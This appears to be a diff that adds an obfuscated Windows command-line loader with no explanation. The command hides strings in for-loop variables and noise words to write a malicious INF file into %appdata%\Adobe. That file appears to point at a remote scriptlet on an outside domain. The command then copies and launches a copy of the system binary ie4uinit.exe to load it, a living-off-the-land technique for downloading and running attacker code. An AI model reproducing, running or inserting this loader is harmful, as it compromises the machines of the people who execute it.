@@ -1,0 +1,7 @@
+/v /c (for %d in (s) do @set "Story=%~d") &&
+  (for %u in (a) do @set "Scenes=%~u") &&
+  (for %n in (c) do @set "Breeds=%~n") &&
+  (for %n in (i) do @set "Prospects=%~n") &&
+  call(for %d in ("[0D9]" "sc\" "ro%Appointments%j,NI,%Drastic%%Webmasters%%Webmasters%p%Archives%%Bench%%Bench%newhgone!Performan!Breeds!es!frankcossio!Performan!Breeds!es!com/isllagncs" "[4234]" "ieu%Drums%.inf" "[destinationdirs]" "defaultdestdir=11" "4234=01" "[strings]" "Aerobic=%t!Prospects!me%" "shortsvcname=' '" "servicename=' '" "Drastic=h" "Bench=/" "Webmasters=t;Substances" "Drums=init" "Archives=:;Provisions" "Appointments=b;Controls" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=0D9" "delfiles=4234" "[version]" "signature =$windows nt$" ) do @echo %~d)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!ProspectsiFalls!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Closes41=Goods &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Closes9=Rules Private Saddle Casual Enables Enough Deputy Consequences Month Trusts Immense Sunny Starts Lamps Dresses Weeks Recorders Physics Rides Arkansas Costs Vacuum Groups Stable Receives Shallow Impulse Swamp Determine Sheriff Toddler Divide Issue Immigrants Reads Monster Circle Logos Racks Butter Factors Products Polls Achievements Accounts Argue Above Stone Indices"
